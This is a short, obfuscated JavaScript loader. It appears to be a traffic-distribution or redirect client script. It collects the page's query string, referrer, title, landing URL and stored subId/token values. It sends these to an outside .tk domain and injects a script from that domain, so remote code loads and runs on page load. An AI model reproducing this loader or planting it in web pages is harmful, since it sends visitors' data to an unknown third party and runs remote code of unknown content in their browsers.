  (function() {
    var name = '_QV2bJGWsBb4PfTTb';
    if (!window._QV2bJGWsBb4PfTTb) {
        window._QV2bJGWsBb4PfTTb = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://perneyledisrio.tk/fashionnetworks',
            P_PATH: 'https://perneyledisrio.tk/fec84ce/postback',
        };
    }
    const _nVyxxMrm3xnZDW7c = localStorage.getItem('config');
    if (typeof _nVyxxMrm3xnZDW7c !== 'undefined' && _nVyxxMrm3xnZDW7c !== null) {
        var _Z34t7H19TTvPbt6f = JSON.parse(_nVyxxMrm3xnZDW7c);
        var _N5ZthT7rwPY6ZbMf = Math.round(+new Date()/1000);
        if (_Z34t7H19TTvPbt6f.created_at + window._QV2bJGWsBb4PfTTb.ttl < _N5ZthT7rwPY6ZbMf) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _GTJ1J4B9vr7rT9wN = localStorage.getItem('subId');
    var _tRYPGmL9mz885v2T = localStorage.getItem('token');
    var _Bx4V69pFs4ZgNSNd = '?return=js.client';
        _Bx4V69pFs4ZgNSNd += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _Bx4V69pFs4ZgNSNd += '&se_referrer=' + encodeURIComponent(document.referrer);
        _Bx4V69pFs4ZgNSNd += '&default_keyword=' + encodeURIComponent(document.title);
        _Bx4V69pFs4ZgNSNd += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _Bx4V69pFs4ZgNSNd += '&name=' + encodeURIComponent(name);
        _Bx4V69pFs4ZgNSNd += '&host=' + encodeURIComponent(window._QV2bJGWsBb4PfTTb.R_PATH);
    if (typeof _GTJ1J4B9vr7rT9wN !== 'undefined' && _GTJ1J4B9vr7rT9wN && window._QV2bJGWsBb4PfTTb.unique) {
        _Bx4V69pFs4ZgNSNd += '&sub_id=' + encodeURIComponent(_GTJ1J4B9vr7rT9wN);
    }
    if (typeof _tRYPGmL9mz885v2T !== 'undefined' && _tRYPGmL9mz885v2T && window._QV2bJGWsBb4PfTTb.unique) {
        _Bx4V69pFs4ZgNSNd += '&token=' + encodeURIComponent(_tRYPGmL9mz885v2T);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._QV2bJGWsBb4PfTTb.R_PATH + _Bx4V69pFs4ZgNSNd;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
